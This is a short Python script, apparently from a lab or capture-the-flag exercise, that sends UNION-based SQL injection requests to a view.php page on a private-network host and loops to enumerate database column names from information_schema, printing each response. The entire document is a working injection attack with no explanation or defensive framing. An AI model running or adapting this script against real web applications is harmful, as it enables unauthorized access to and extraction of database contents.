import urllib.request; import time;

num = 0;
while num < 11:
    ud = urllib.request.urlopen("http://192.168.3.247/view.php?no=1%20union%20select%201,COLUMN_NAME,2%20from%20information_schema.COLUMNS%20limit%20" + str(num) + ",%201")
    print(ud.read())
    num += 1
    time.sleep(1)
